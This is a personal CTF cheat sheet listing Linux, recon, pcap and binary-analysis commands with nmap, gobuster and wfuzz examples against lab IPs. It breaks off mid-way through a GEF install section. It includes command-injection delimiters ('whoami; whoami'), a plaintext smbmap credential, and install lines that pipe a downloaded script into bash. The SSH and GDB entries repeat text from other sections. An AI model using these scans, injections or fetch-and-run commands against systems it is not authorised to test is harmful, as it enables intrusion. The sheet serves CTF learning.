<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
# icanhaspii-CTF CheatSheet
## These are my CTF Hacks!  I hope you enjoy!
<details markdown>
  <br>
  <summary>[Linux Analysis Commands]</summary>
<details markdown>
  <br>
    <summary>[Linux Analysis Commands Julia Evans' CheatSheet]</summary>
Thank you Julia Evans! See more of her art here: 
<a href="https://wizardzines.com" target="_blank">https://wizardzines.com</a><br><br>
  <img src="images/image226.jpg"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - file]</summary>
Run this to determine what type of file you are dealing with:<br><br>
<img src="images/File_Screenshot 2023-10-03 203208.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - binwalk]</summary>
Run this to view a summary of the file contents:<br><br>
<img src="images/BinWalk_Screenshot 2023-10-03 203227.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - strings]</summary>
Run this to get the list of printable characters from files.  You can even run strings on a Pcap!  Or, say for example, that you have something you think contains a flag and you know that flag is in the typical CTF format of flag{some_bonus}, you can run the following to cut down on the amount of data you have to parse through. The following will only yield lines of 8 characters or more:<br><br>
<img src="images/Strings_Screenshot 2023-05-12 172558.jpg"><br><br>
You can also combine strings and grep:<br><br>
<img src="images/Strings_Screenshot 2023-05-12 174704.jpg">
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - java -jar]</summary>
The java -jar command will open a .jar file:<br><br>
<img src="images\Java_JarStegSolveHowTo.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - java]</summary>
The java command will open a .java file:<br><br>
<img src="images/Java_Screenshot 2022-06-15 085349_Edited.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - base64]</summary>
The base64 decode command will decode a b64 string.  There’s more than one way to invoke the base64 decode command, here are few:<br><br>
1. Grab a base64 encoded string such as: Umlja19SMGxsM2Q=<br><br>
2. Type the following into your Linux command prompt to echo/print to screen:<br><br>
echo 'Umlja19SMGxsM2Q=' | base64 -d<br><br>
3. Hit ENTER<br><br>
<img src="images/Base64_Screenshot 2023-11-08 172521.png"><br><br>
4. If you’re feeling really fancy, and you are playing a CTF, you can run the following to echo/print your decoded b64 in standard flag format to your screen:<br><br>
echo "flag{$(echo 'Umlja19SMGxsM2Q=' | base64 -d)}"<br><br>
<img src="images/Base64_Screenshot 2023-11-08 180945.png"><br><br>
-Here’s another way:<br><br>
1. Grab a base64 encoded string such as: Umlja19SMGxsM2Q=<br><br>
2. Type the following into your Linux command prompt:<br><br>
Base64 –d<br><br>
3. Hit ENTER<br><br>
<img src="images/Base64_Screenshot 2023-11-08 173111.png"><br><br>
4. At the prompt, paste in your base64 encoded string:<br><br>
<img src="images/Base64_Screenshot 2023-11-08 173249.png"><br><br>
5. Hit ENTER again:<br><br>
<img src="images/Base64_Screenshot 2023-11-08 173640.png"><br><br>
6. Finally, hit Control-D on your keyboard:<br><br>
<img src="images/Base64_Screenshot 2023-11-08 172847.png"><br><br>
-And yet another method:<br><br>
1. Save your base64 encoded string into a text editor:<br><br>
<img src="images/Base64_Screenshot 2023-11-08 174625.png"><br><br>
2. Type the following into your Linux command prompt to echo/print to screen:<br><br>
base64 -d dns.txt >decoded.txt<br><br>
<img src="images/Base64_Screenshot 2023-11-08 174546.png"><br><br>
3. Open your new file, “decoded.txt”:<br><br>
<img src="images/Base64_Screenshot 2023-11-08 174720.png"><br><br>
If you run across encoding similar to below:<br><br>
IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String<br><br>
[IO.Compression.CompressionMode]::Decompress<br><br>
You can try the following “Recipe” in CyberChef to decode:<br><br>
(a)From_Base64('A-Za-z0-9%2B/%3D',true,false)<br><br>
(b) Raw_Inflate(0,0,%5B'Adaptive','Block'%5D,false,false)<br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - ifconfig]</summary>
To find your ip address and network configuration, you can use the old ifconfig command (considered depreciated), or the newer ip address command.  It works with any of the following, and of course more in depth combined with switches:<br><br>
<img src="images/ip_Screenshot 2023-11-09 105007.png"><br><br>
<img src="images/ip_Screenshot 2023-11-09 104951.png"><br><br>
<img src="images/ip_Screenshot 2023-11-09 104928.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - realpath]</summary>
realpath converts each filename argument to an absolute pathname, which has no components that are symbolic links or the special . or .. directory entries. Each path component in the filename must exist, otherwise realpath will fail and non-zero exit status will be returned.<br><br>
href="https://www.google.com/url?q=https://linux.die.net/man/1/realpath&amp;sa=D&amp;source=editors&amp;ust=1699590511374365&amp;usg=AOvVaw1FkT0L7tNSOCrQIqhPv2FA">https://linux.die.net/man/1/realpath</a><br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - SSH]</summary>
To find your ip address and network configuration, you can use the old ifconfig command (considered depreciated), or the newer ip address command.  It works with any of the following, and of course more in depth combined with switches:<br><br>
https://www.lrz.de/services/compute/courses/x_lecturenotes/191007_OpenSSH_Tutorial_2019.pdf<br><br>
https://opensource.com/article/20/9/ssh<br><br>
<img src="images/image181.jpg"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - chmod]</summary>
chmod +x<br><br>
Note: chmod +x (plus x) stands for execute.<br><br>
Question:<br><br>
I want to write the Ubuntu analogue of a "batch file" (a shell script). But I don't know how to use chmod +x filename command to make it so that the script can be run. Nor do I know where to use it.<br><br>
Answer:<br><br>
chmod +x on a file (your script) only means, that you'll make it executable. Right click on your script and chose Properties -> Permissions -> Allow executing file as program, leaves you with the exact same result as the command in terminal.<br><br>
If a file you want to change permissions on is located within the systems directory you may need to be root, like so: (be careful, while using sudo command)<br><br>
sudo chmod +x /usr/share/testfolder/aFile<br><br>
https://askubuntu.com/questions/443789/what-does-chmod-x-filename-do-and-how-do-i-use-it<br><br>
Question:<br><br>
What is the difference between chmod u+x and just chmod +x? I have seen a ton of tutorials that say to use u+x to make scripts executable. However, omitting the u doesn't seem to have any effect.<br><br>
Answer:<br><br>
The man page of chmod covers that.<br><br>
u stands for user.<br><br>
g stands for group.<br><br>
o stands for others.<br><br>
a stands for all.<br><br>
That means that chmod u+x somefile will grant only the owner of that file execution permissions whereas chmod +x somefile is the same as chmod a+x somefile.<br><br>
<a href="https://askubuntu.com/questions/29589/chmod-ux-versus-chmod-x" target="_blank">https://askubuntu.com/questions/29589/chmod-ux-versus-chmod-x</a><br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - chown]</summary>
To give a file permissions so that a regular user can move it or edit it, you can run the following:<br><br>
# chown kali NTUSER.DAT.dat<br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - Bash]</summary>
Bash (Bourne-Again SHell) is one of the most commonly used Unix/Linux shells and is the default shell in many Linux distributions.<br><br>
<a href="https://www.freecodecamp.org/news/bash-scripting-tutorial-linux-shell-script-and-command-line-for-beginners" target="_blank">https://www.freecodecamp.org/news/bash-scripting-tutorial-linux-shell-script-and-command-line-for-beginners</a><br><br>
Some of the main delimiters (terminators or redirectors) for Bash commands are as follows:<br>
whoami; whoami<br>
whoami|<br><br>
> (output to)<br>
|| (double pipe)<br>
</details>



<details markdown>
  <br>
    <summary>[Linux Analysis Commands - top]</summary>
The top command displays the Table of Processes:<br><br>
<img src="images/image229.png"><br><br>
</details>



<details markdown>
  <br>
    <summary>[Linux Analysis Commands - ps -elf]</summary>
The ps -elf command displays the Process Status:<br><br>
<a href="https://www.xitalogy.com/linux-unix/2020/02/22/ps-elf-filter-results-effectively-and-see-if-a-linux-process-is-running.html">https://www.xitalogy.com/linux-unix/2020/02/22/ps-elf-filter-results-effectively-and-see-if-a-linux-process-is-running.html</a><br><br>
<img src="images/image232.png"><br><br>
<img src="images/image231.png"><br><br>
<img src="images/image234.png"><br><br>
</details>



<details markdown>
  <br>
    <summary>[Linux Analysis Commands - grep]</summary>
Some common grep options:<br><br>
<img src="images/image165.png"><br><br>
<img src="images/Screenshot 2023-11-15 203316.png"><br><br>
grep example: cat cowrie.log.wwhf2020_lab2 | grep CMD<br><br>
<img src="images/image163.jpg"><br><br>
<img src="images/image155.jpg"><br><br>
Count w/ grep:<br><br>
<img src="images/image154.png"><br><br>
<img src="images/image158.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Linux Analysis Commands - curl]</summary>
Curl is useful in transferring data without user interaction.<br><br>
curl http://nidus-setup:8080<br><br>
curl -X POST http://nidus-setup:8080/api/cooler -H "Content-Type: application/json" --data-binary '{"temperature":1000}'<br><br>
<img src="images/image157.png"><br><br>
</details>


<details markdown>
  <br>
    <summary>[Linux Analysis Commands - Nano/VIM Alternative]</summary>
<p class="c3"><span class="c9"></span></p><ul class="c8 lst-kix_list_43-0"><li class="c0 li-bullet-0"><span class="c9">Nano/VIM Alternative:</span></li></ul><p class="c3"><span class="c1"></span></p><ul class="c8 lst-kix_list_45-0 start"><li class="c0 li-bullet-0"><span class="c9">We can use nano to edit the &ldquo;hosts&rdquo; file:</span></li></ul><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 210.00px; height: 51.67px;"><img alt="" src="images/image148.png" style="width: 210.00px; height: 51.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c2"></span></p><ul class="c8 lst-kix_list_46-0 start"><li class="c0 li-bullet-0"><span class="c9">We can add office.paper to the &ldquo;hosts&rdquo; file, and hit Control-x, then the &ldquo;y&rdquo; key, and then the &ldquo;Enter&rdquo; key, to Exit and Save:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 398.00px; height: 188.13px;"><img alt="" src="images/image150.png" style="width: 398.00px; height: 188.13px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p>
</details>



<details markdown>
  <br>
    <summary>[Linux Analysis Commands - cat]</summary>
<ul class="c8 lst-kix_list_50-0"><li class="c0 li-bullet-0"><span class="c9">cat:</span></li></ul><p class="c4"><span class="c2">The cat command can be used to display the contents of a file on-screen.</span></p><p class="c3"><span class="c2"></span></p>
</details>




<details markdown>
  <br>
    <summary>[Linux Analysis Commands - type]</summary>
<ul class="c8 lst-kix_list_50-0"><li class="c0 li-bullet-0"><span class="c9">type:</span></li></ul><p class="c4"><span class="c2">The type command can be used on the Windows Command Line to display the contents of a file on-screen (in case you find yourself gaining access to a Windows box).</span></p><p class="c3"><span class="c2"></span></p>
</details>


<details markdown>
  <br>
    <summary>[Linux Analysis Commands - pwsh]</summary>
<ul class="c8 lst-kix_list_50-0"><li class="c0 li-bullet-0"><span class="c9">pwsh:</span></li></ul><p class="c4"><span class="c2">PowerShell works on Linux and was already natively on my Kali box. &nbsp;You can use many of the Linux commands in PowerShell that you would from a Linux terminal, such as sudo apt update and others:</span></p><p class="c3"><span class="c2"></span></p>

<p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 474.00px; height: 245.00px;"><img alt="" src="images/image152.jpg" style="width: 474.00px; height: 245.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c2"></span></p> 
</details>
</details>
<br>






















<details markdown>
  <br>
  <summary>[Discovery]</summary>
<details markdown>
  <br>
    <summary>[Discovery - Nmap]</summary>
CompariTech Nmap CheatSheet:<br><br>
<img src="images/image134.jpg"><br><br>
Here's a quick initial scan which pipes the output to a file called “scan.initial”:<br>
Sudo nmap -sV -sC -oN scan.initial 10.10.147.28<br><br>
<img src="images/image135.jpg"><br><br>
Here's another initial scan example which pipes the output to a file called “scan.initial” - this one took quite a bit longer to finish.<br>
Sudo nmap -A -oN scan.initial 10.10.20.194<br><br>
<img src="images/image136.jpg"><br><br>
Here’s an example that we can run on a port that we know is open, so here we know port 80 is open, and we can pipe those results to a file called scan.initial:<br>
nmap -A -p 80 10.10.129.65 -oN scan.initial<br><br>
<img src="images/image120.jpg"><br><br>
Here's one more example, which pipes the output to a file called “scan.initial”. I've heard this called "a classic IppSec scan" since he often begins his streams with this scan:<br>
nmap -sV -sC -oN scan.initial 10.10.73.1<br><br>
<img src="images/image121.jpg"><br><br>
And one more for all of us IppSec fans out there, this is also a common IppSec scan:<br><br>
nmap -sC -sV -oA nmapScan1 10.10.10.5<br><br>
The sC is for safe scripts or the most common scripts, sV is for "Enumerate Versions", and oA is for "Output All Formats", and then we call the file “NmapScan1”.<br>
<a href="https://nmap.org/book/nse-usage.html" target="_blank">https://nmap.org/book/nse-usage.html</a><br>
<a href="https://www.youtube.com/watch?v=2LNyAbroZUk&ab_channel=IppSec" target="_blank">https://www.youtube.com/watch?v=2LNyAbroZUk&ab_channel=IppSec</a><br><br>
<img src="images/image123.png"><br><br>
sudo nmap -F -sV 10.10.11.143<br>
sudo nmap -v -sC -sV -oA nm nmap/PlayerTwo 10.10.11.143<br>
Sudo nmap -sS -A -sC -sV -p- -T 410.10.11.143<br>
-sC for default enumeration scripts<br>
-sV for enumerating versions<br>
-F for a Fast Scan<br><br>
<img src="images/image125.png"><br><br>
Nmap Port Scan:<br><br>
-p0- asks Nmap to scan every possible TCP port, -v asks Nmap to be verbose about it, -A enables aggressive tests such as remote OS detection, service/version detection, and the Nmap Scripting Engine (NSE). Finally, -T4 enables a more aggressive timing policy to speed up the scan.<br>
Example: nmap -p0- -v -A -T4 scanme.nmap.org<br>
<a href="https://nmap.org/book/port-scanning-tutorial.html" target="_blank">https://nmap.org/book/port-scanning-tutorial.html</a><br>
Nmap w/ Service enumeration on all ports:<br>
nmap -p- -sV target_ip<br><br>
<img src="images/image127.png"><br><br>
Nmap Version Detection Scan:<br>
-sV (Version detection).  Alternatively, you can use -A, which enables version detection among other things.<br>
<a href="https://nmap.org/book/man-version-detection.html" target="_blank">https://nmap.org/book/man-version-detection.html</a><br><br>
<img src="images/image128.jpg"><br><br>
Nmap Full Scan on all ports w/ -oA FullScan which pipes our output to a file called “FullScan”:<br><br>
<img src="images/image130.jpg"><br><br>
└─# nmap -sVC -T4 -Pn -p- 10.129.136.188 -oA FullScan<br><br>
Nmap Syn Scan:<br><br>
nmap -sS<br><br>
<img src="images/image113.png"><br><br>
Nmap Ping Scan:<br><br>
nmap -sn 10.10.89.196<br><br>
<img src="images/image115.png"><br><br>
Nmap Version Enumeration Scan:<br><br>
nmap -sV 10.10.89.196<br>
</details>

<details markdown>
  <br>
    <summary>[Discovery - MasScan]</summary>
<a href="https://github.com/robertdavidgraham/masscan" target="_blank">https://github.com/robertdavidgraham/masscan</a><br><br>
MasScan is incredibly powerful and quick but it can break things, for example be careful scanning ICS.<br>
masscan -p1-65535 10.10.129.65 --rate=1000 -e tun0<br><br>
<img src="images/image118.jpg"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Discovery - SMBmap]</summary>
smbmap -u ubuntu -p S@nta2022 -d workgroup -H 10.10.112.67<br><br>
<img src="images/image175.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Discovery - GoBuster]</summary>
GoBuster is a tool to catalogue directories. GoBuster can take significantly longer to complete than some of the other Dir searching tools, but that might not necessarily be a bad thing:<br><br>
gobuster dir -u 10.10.11.143 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br><br>
<img src="images/image153.png"><br><br>
└─# gobuster dir -u 10.10.11.143 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br><br>

===============================================================<br><br>

Gobuster v3.1.0<br><br>

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)<br><br>

===============================================================<br><br>

[+] Url:                     http://10.10.11.143<br><br>

[+] Method:                  GET<br><br>

[+] Threads:                 10<br><br>

[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br><br>

[+] Negative Status codes:   404<br><br>

[+] User Agent:              gobuster/3.1.0<br><br>

[+] Timeout:                 10s<br><br>

===============================================================<br><br>

2022/05/13 16:44:32 Starting gobuster in directory enumeration mode<br><br>

===============================================================<br><br>

/manual               (Status: 301) [Size: 235] [--> http://10.10.11.143/manual/]<br><br>

===============================================================<br><br>

2022/05/13 16:53:14 Finished<br><br>

===============================================================<br><br>

Another GoBuster Example Below:<br><br>

<img src="images/image185.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Discovery - DirSearch]</summary>
DirSearch is a robust web content discovery tool:<br><br>
dirsearch -u http://SiteYouWantToSearch -e php<br><br>
<img src="images/image184_Edited.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Discovery - FeroxBuster]</summary>
A simple, fast, recursive content discovery tool written in Rust.  Forced browsing is an attack where the aim is to enumerate and access resources that are not referenced by the web application, but are still accessible by an attacker.  feroxbuster uses brute force combined with a wordlist to search for unlinked content in target directories. These resources may store sensitive information about web applications and operational systems, such as source code, credentials, internal network addressing, etc.  This attack is also known as Predictable Resource Location, File Enumeration, Directory Enumeration, and Resource Enumeration.<br><br>
<a href="https://github.com/epi052/feroxbuster" target="_blank">https://github.com/epi052/feroxbuster</a><br><br>
<a href="https://epi052.github.io/feroxbuster-docs/docs" target="_blank">https://epi052.github.io/feroxbuster-docs/docs</a><br><br>
</details>

<details markdown>
  <br>
    <summary>[Discovery - Sublist3r]</summary>
Sublist3r is a python tool designed to enumerate subdomains of websites using OSINT.<br>
<a href="https://www.kali.org/tools/sublist3r" target="_blank">https://www.kali.org/tools/sublist3r</a><br><br>
</details>

<details markdown>
  <br>
    <summary>[Discovery - Ffuf]</summary>
A fast web fuzzer for directory discovery, virtual host discovery, and GET/POST parameter fuzzing.
<a href="https://github.com/ffuf/ffuf" target="_blank">https://github.com/ffuf/ffuf</a><br>
<a href="https://www.tsustyle.com/cheatsheets/ffuf-cheatsheet" target="_blank">https://www.tsustyle.com/cheatsheets/ffuf-cheatsheet</a><br>
<a href="https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html" target="_blank">https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html</a><br>
<a href="https://www.youtube.com/watch?v=QBW70TdxzKo&ab_channel=FuzzingLabs-PatrickVentuzelo" target="_blank">https://www.youtube.com/watch?v=QBW70TdxzKo&ab_channel=FuzzingLabs-PatrickVentuzelo</a><br>
<a href="https://www.youtube.com/watch?v=aN3Nayvd7FU&ab_channel=InsiderPhD" target="_blank">https://www.youtube.com/watch?v=aN3Nayvd7FU&ab_channel=InsiderPhD</a><br><br>

Ffuf Example:<br><br>

└─# ffuf -u http://10.10.147.28/FUZZ -w /usr/share/wordlists/dirb/common.txt<br>

        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\       
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/       
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/
</details>

<details markdown>
  <br>
  <summary>[Discovery - Wfuzz]</summary>
Wfuzz is a WebApp framework for finding directories, scripts, etc. 
<a href="https://github.com/xmendez/wfuzz" target="_blank">https://github.com/xmendez/wfuzz</a><br>
<a href="https://wfuzz.readthedocs.io/en/latest" target="_blank">https://wfuzz.readthedocs.io/en/latest</a><br>
<a href="https://www.youtube.com/watch?v=QBW70TdxzKo&ab_channel=FuzzingLabs-PatrickVentuzelo" target="_blank">https://www.youtube.com/watch?v=QBW70TdxzKo&ab_channel=FuzzingLabs-PatrickVentuzelo</a><br><br>

└─$ wfuzz -w /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt -u http://host1.metaproblems.com:5730/FUZZ<br><br>

/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.<br><br>

********************************************************<br><br>

* Wfuzz 3.1.0 - The Web Fuzzer                         *<br><br>

********************************************************<br><br>

Target: http://host1.metaproblems.com:5730/FUZZ<br><br>

Total requests: 48<br><br>

=====================================================================<br><br>

ID           Response   Lines    Word       Chars       Payload<br><br>                 

=====================================================================<br><br>

000000001:   404        9 L      31 W       286 Ch      "ServiceDefinition"<br><br>  

000000024:   404        9 L      31 W       286 Ch      "oracle"<br><br>      

000000015:   404        9 L      31 W       286 Ch      "jboss-net"<br><br>       

000000020:   404        9 L      31 W       286 Ch      "name"<br><br>        

000000021:   404        9 L      31 W       286 Ch      "names"<br><br>          

000000022:   404        9 L      31 W       286 Ch      "operation"<br><br>

000000023:   404        9 L      31 W       286 Ch      "operations"<br><br> 

000000003:   404        9 L      31 W       286 Ch      "atom"<br><br>       

000000007:   404        9 L      31 W       286 Ch      "disco"<br><br>

000000025:   404        9 L      31 W       286 Ch      "proxy"<br><br>      

000000019:   404        9 L      31 W       286 Ch      "methods"<br><br>       

000000018:   404        9 L      31 W       286 Ch      "manual"<br><br>     

000000016:   404        9 L      31 W       286 Ch      "jbossws"<br><br>          

000000009:   404        9 L      31 W       286 Ch      "index"<br><br>                

000000006:   404        9 L      31 W       286 Ch      "default"<br><br>                

000000017:   404        9 L      31 W       286 Ch      "juddi"<br><br>                 

000000010:   404        9 L      31 W       286 Ch      "inquire"<br><br>               

000000012:   404        9 L      31 W       286 Ch      "inspection"<br><br>              

000000014:   404        9 L      31 W       286 Ch      "interfaces"<br><br>              

000000013:   404        9 L      31 W       286 Ch      "interface"<br><br>              

000000011:   404        9 L      31 W       286 Ch      "inquiryapi"<br><br>             

000000008:   404        9 L      31 W       286 Ch      "extwsdl"<br><br>               

000000026:   404        9 L      31 W       286 Ch      "publish"<br><br>              

000000045:   404        9 L      31 W       286 Ch      "wsdl"<br><br>                    

000000004:   404        9 L      31 W       286 Ch      "axis"<br><br>                    

000000002:   404        9 L      31 W       286 Ch      "admin"<br><br>                   

000000044:   404        9 L      31 W       286 Ch      "wsatom"<br><br>                  

000000046:   404        9 L      31 W       286 Ch      "wsgw"<br><br>                   

000000040:   404        9 L      31 W       286 Ch      "webserviceclient+ssl"<br><br>   

000000032:   404        9 L      31 W       286 Ch      "svce"<br><br>                    

000000005:   404        9 L      31 W       286 Ch      "context"<br><br>                 

000000028:   404        9 L      31 W       286 Ch      "query"<br><br>                   

000000042:   404        9 L      31 W       286 Ch      "ws"<br><br>                      

000000039:   404        9 L      31 W       286 Ch      "webserviceclient"<br><br>       

000000043:   404        9 L      31 W       286 Ch      "ws4ee"<br><br>                  

000000034:   404        9 L      31 W       286 Ch      "uddiexplorer"<br><br>            

000000030:   404        9 L      31 W       286 Ch      "service"<br><br>                

000000027:   404        9 L      31 W       286 Ch      "publishing"<br><br>              

000000036:   404        9 L      31 W       286 Ch      "uddilistener"<br><br>            

000000033:   404        9 L      31 W       286 Ch      "uddi"<br><br>                    

000000041:   404        9 L      31 W       286 Ch      "webservices"<br><br>             

000000035:   404        9 L      31 W       286 Ch      "uddigui"<br><br>                

000000038:   404        9 L      31 W       286 Ch      "webservice"<br><br>              

000000037:   404        9 L      31 W       286 Ch      "uddisoap"<br><br>                

000000031:   404        9 L      31 W       286 Ch      "services"<br><br>                

000000029:   404        9 L      31 W       286 Ch      "rss"<br><br>                     

000000048:   404        9 L      31 W       286 Ch      "xmethods"<br><br>                

000000047:   404        9 L      31 W       286 Ch      "wsil"<br><br>                    

Total time: 0<br><br>

Processed Requests: 48<br><br>

Filtered Requests: 0<br><br>

Requests/sec.: 0<br><br>
</details>
</details>
<br>



<details markdown>
  <summary>[Pcap Analysis]</summary>
<details markdown>
  <br>
    <summary>[Pcap Analysis - strings]</summary>
Strings<br><br>
You can run strings on a Pcap! Below are a couple examples (I like to pipe my results to a .txt file for easier review):<br><br>
<img src="images/StringsPcap_Screenshot 2023-11-09 184958.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Pcap Analysis - TShark]</summary>
<a href="https://osqa-ask.wireshark.org/questions/38071/how-to-extract-ip-addresses-from-cap-file-to-text-file" target="_blank">You can extract ip addresses from a Pcap using Tshark</a><br><br>
To extract just the destination ip, type the following command:<br><br>
<img src="images/TShark_Screenshot 2023-03-16 211016.jpg"><br><br>
To extract both the destination ip and the source ip, type the following command:<br><br>
<img src="images/TShark_Screenshot 2023-03-16 211435.jpg"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Pcap Analysis - Zeek]</summary>
<a href="https://www.youtube.com/watch?v=bznH1yMyjjo&ab_channel=JohnHubbard" target="_blank">John Hubbard has a fantastic install video</a><br><br>
Zeek installs itself here:<br><br>
<img src="images/Zeek_Screenshot 2023-03-24 201006_Edited.jpg"><br><br>
To export logs from a Pcap into Zeek format, type the following syntax (r is for read):<br><br>
<img src="images/Zeek_Screenshot 2023-03-24 201006.jpg"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Pcap Analysis - RITA]</summary>
RITA (Real Intelligence Threat Analytics):<br><br>
<a href="https://www.activecountermeasures.com/free-tools/rita" target="_blank">RITA is named in honor of John Strand’s mother who is no longer with us but will always be remembered in this loving way</a><br><br>
<a href="https://www.youtube.com/watch?v=QcQmG5KTLpo&ab_channel=ActiveCountermeasures" target="_blank">Chris Brenton has a fantastic install video</a><br><br>
To import logs from Zeek format into RITA, navigate via command line to the folder where your exported Pcap logs are:<br><br>
<img src="images/image62.jpg"><br><br>
Next, type the following syntax (LogsOily was the name of my pcap, so I called the output folder for RITA the same name):<br><br>
<img src="images/image64.png"><br><br>
RITA will tell you when it’s done:<br><br>
<img src="images/image66.jpg"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Pcap Analysis - TCPflow]</summary>
TCPflow is a command-line tool for processing streams.<br>
<a href="https://linux.die.net/man/1/tcpflow" target="_blank">https://linux.die.net/man/1/tcpflow</a><br>
<a href="https://www.geeksforgeeks.org/tcp-flow-analyze-and-debug-network-traffic-in-linux/#" target="_blank">https://www.geeksforgeeks.org/tcp-flow-analyze-and-debug-network-traffic-in-linux/#</a><br>
<a href="https://simson.net/ref/2013/2013-12-05_tcpflow-and-BE-update.pdf" target="_blank">https://simson.net/ref/2013/2013-12-05_tcpflow-and-BE-update.pdf</a><br><br>
<img src="images/image183.png"><br><br>
<img src="images/image209.png"><br><br>
</details>
</details>
<br>



<details markdown>
  <br>
  <summary>[Binary Analysis]</summary>
<details markdown>
  <br>
    <summary>[Binary Analysis - dmesg command]</summary>
Note: Run after you launch an app that you want to find out more about, errors and such.<br><br>
The dmesg command is a Linux utility that displays kernel-related messages retrieved from the kernel ring buffer. The ring buffer stores information about hardware, device driver initialization, and messages from kernel modules that take place during system startup.<br><br>
<a href="https://phoenixnap.com/kb/dmesg-linux" target="_blank">https://phoenixnap.com/kb/dmesg-linux</a><br>
<a href="https://www.geeksforgeeks.org/how-to-use-the-dmesg-command-on-linux" target="_blank">https://www.geeksforgeeks.org/how-to-use-the-dmesg-command-on-linux</a><br>
<a href="https://linuxize.com/post/dmesg-command-in-linux" target="_blank">https://linuxize.com/post/dmesg-command-in-linux</a><br><br>
<img src="images/image68.png"><br><br>
<img src="images/image70.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - readelf command]</summary>
readelf displays information about one or more ELF format object files. The options control what particular information to display.<br><br>
elffile... are the object files to be examined. 32-bit and 64-bit ELF files are supported, as are archives containing ELF files.<br><br>
This program performs a similar function to objdump but it goes into more detail and it exists independently of the BFD (Binary File Descriptor) library, so if there is a bug in BFD, then readelf will not be affected.<br><br>
<a href="https://man7.org/linux/man-pages/man1/readelf.1.html" target="_blank">https://man7.org/linux/man-pages/man1/readelf.1.html</a><br><br>
<img src="images/image33.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - GDB]</summary>
readelf displays information about one or more ELF format object files. The options control what particular information to display.<br><br>
elffile... are the object files to be examined. 32-bit and 64-bit ELF files are supported, as are archives containing ELF files.<br><br>
This program performs a similar function to objdump but it goes into more detail and it exists independently of the BFD (Binary File Descriptor) library, so if there is a bug in BFD, then readelf will not be affected.<br><br>
<a href="https://web.stanford.edu/class/archive/cs/cs107/cs107.1186/guide/gdb.html" target="_blank">https://web.stanford.edu/class/archive/cs/cs107/cs107.1186/guide/gdb.html</a><br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - GEF]</summary>
Install GEF to enhance GDB.<br><br>
<a href="https://github.com/hugsy/gef" target="_blank">https://github.com/hugsy/gef</a><br>
<a href="https://hugsy.github.io/gef" target="_blank">https://hugsy.github.io/gef</a><br><br>
Instant Setup - WHAT WORKED FOR ME IS FROM INSIDE GDB, SCROLL DOWN...:<br><br>
Simply make sure you have GDB 8.0 or higher compiled with Python3.6+ bindings, then:<br><br>
# via the install script<br>
## using curl<br>
$ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"<br><br>

## using wget<br>
$ bash -c "$(wget https://gef.blah.cat/sh -O -)"<br><br>

# or manually<br>
$ wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py<br>
$ echo source ~/.gdbinit-gef.py >> ~/.gdbinit<br><br>

# or alternatively from inside gdb directly<br>
$ gdb -q<br>
